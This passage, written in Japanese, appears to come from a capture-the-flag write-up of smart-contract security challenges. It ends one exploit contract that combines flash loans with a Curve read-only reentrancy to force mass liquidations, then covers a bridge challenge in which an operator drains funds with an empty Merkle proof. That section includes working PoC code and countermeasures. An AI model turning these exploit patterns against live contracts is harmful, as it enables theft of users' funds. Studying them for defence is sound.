        amts[0] = AAVE_WETH;        amts[1] = AAVE_WSTETH;
        (bool ok,) = aavePool.call(abi.encodeWithSignature(
            "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
            address(this), assets, amts, modes, address(this), bytes(""), uint16(0)));
        require(ok, "aave flashloan failed");
        // Balancerへ返済（手数料なし）
        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
    }

    function executeOperation(address[] calldata, uint256[] calldata, uint256[] calldata premiums,
        address initiator, bytes calldata) external returns (bool) {
        require(msg.sender == aavePool && initiator == address(this));
        // 1) 借りたtokenをすべてプールのcoin（ETH + stETH）に変換
        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));
        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this)));
        stETH.approve(address(curvePool), type(uint256).max);
        // 2) 巨大な（stETH多めの）liquidityを追加
        uint256 stEthAmount = stETH.balanceOf(address(this));
        uint256 ethForLp = address(this).balance;
        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);
        // 3) liquidate()時にlendingがLPを引けるようにする
        IERC20(lpToken).approve(address(permit2), type(uint256).max);
        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));
        // 4) remove -> プールがreceive()へrawコールでETH送付 -> 清算ウィンドウ
        state = State.LIQUIDATING;
        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
        state = State.NONE;
        // 5) 返済: ETH余剰 -> stETH -> wstETH で不足分を補う
        uint256 wethOwed   = AAVE_WETH + premiums[0] + BAL_WETH;
        uint256 wstethOwed = AAVE_WSTETH + premiums[1] + BAL_WSTETH;
        weth.deposit{value: wethOwed}();
        uint256 ethBal = address(this).balance;
        if (ethBal > ETH_RESERVE) {
            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
                abi.encodeWithSignature("submit(address)", address(0)));
            require(ok, "lido submit failed");
        }
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(stETH.balanceOf(address(this)));
        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");
        IERC20(address(weth)).approve(aavePool, AAVE_WETH + premiums[0]);
        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + premiums[1]);
        return true;
    }

    receive() external payable {
        if (state != State.LIQUIDATING) return;
        // 今virtual_priceは膨張中（read-only reentrancy）-> 全ポジション清算可能
        for (uint256 i = 0; i < users.length; i++) lending.liquidate(users[i]);
    }
}
```

## 18. Withdrawal
L2のログをマークルプルーフで検証してL1でwithdrawalをfinalizeするL2→L1トークンブリッジ。operatorがproof検証をスキップでき、呼び出しの失敗も無視される。
### 目標 :
- 与えられた4つのwithdrawal（怪しいものも含む）をすべてL1 gatewayでfinalizeする（counter >= 4）
- token bridgeはいくらか資金を失うが、損失は1%未満に抑える
- playerは最終的にtokenを0にする
### 脆弱性 :
- `L1Gateway.finalizeWithdrawal()`は`OPERATOR_ROLE`を持つ者（player）なら**空のMerkle proof**でwithdrawalをfinalizeできる
- 外部呼び出しの**前に**leafをfinalized扱いにしてcounterを増やし、その**呼び出しの成否を無視する**。そのためtoken送金が失敗してもwithdrawalは「finalize」される
- 4つのwithdrawalのうち3つは正当な10 DVTの送金で、1つ（index 2）が悪意あるもので999,000 DVTを引き出してbridgeを空にする
### 攻撃手順 :
- 7日の遅延はoperatorにも適用されるので`vm.warp`で飛ばす。その後operatorとして、`withdrawals.json`のpayloadをそのままreplayする：
  1. 正当な3つをfinalize
  2. **自作**のwithdrawalをfinalizeして999,000 DVTをplayerへ引き出し、bridgeを空にする
  3. 悪意あるものをfinalize。ここで`TokenBridge.executeTokenWithdrawal`が`totalDeposits -= 999_000e18`を行い**underflowしてrevert**するため、leafは記録されるがtokenは動かない
  4. 999,000 DVTをbridgeへ返す（playerは0になる）
### 対策 :
- 特権ロールがproof検証をスキップできないようにし、finalized扱いにする前にmessageが実際に成功したかを確認し（呼び出しの戻り値/revertをチェック）、1つのmessageでbridgeを空にできないようwithdrawalごとの金額上限を設ける
### POC
```solidity
function test_withdrawal() public checkSolvedByPlayer {
    vm.warp(block.timestamp + l1Gateway.DELAY() + 1 days);
    bytes32[] memory noProof = new bytes32[](0);
    string memory logs = vm.readFile("test/withdrawal/withdrawals.json");

    // 1) 正当な3つのwithdrawalをfinalize（各10 DVT）
    _finalizeLog(logs, 0, noProof);
    _finalizeLog(logs, 1, noProof);
    _finalizeLog(logs, 3, noProof);

    // 2) operatorとして自作のwithdrawalでbridgeの資金をplayerへ抜く
    uint256 drain = 999_000e18;
    bytes memory inner = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", player, drain);
    bytes memory fwd = abi.encodeWithSignature(
        "forwardMessage(uint256,address,address,bytes)", uint256(1000), player, address(l1TokenBridge), inner
    );
    l1Gateway.finalizeWithdrawal(1000, l2Handler, address(l1Forwarder), START_TIMESTAMP, fwd, noProof);

    // 3) 悪意あるものをfinalize -> 内部送金がunderflowでrevert、それでもfinalizeされる
    _finalizeLog(logs, 2, noProof);

    // 4) 抜いたtokenをbridgeへ返す（playerは0に）
    token.transfer(address(l1TokenBridge), drain);
}

// L2 withdrawalのlogをfinalizeWithdrawal経由でreplay（operator, proof不要）
// log data = abi.encode(bytes32 id, uint256 timestamp, bytes message); topics[1]=nonce
function _finalizeLog(string memory logs, uint256 i, bytes32[] memory noProof) private {
    string memory base = string.concat("[", vm.toString(i), "]");
    uint256 nonce = uint256(vm.parseJsonBytes32(logs, string.concat(base, ".topics[1]")));
    bytes memory data = vm.parseJsonBytes(logs, string.concat(base, ".data"));
    (, uint256 timestamp, bytes memory message) = abi.decode(data, (bytes32, uint256, bytes));
    l1Gateway.finalizeWithdrawal(nonce, l2Handler, address(l1Forwarder), timestamp, message, noProof);
}
```
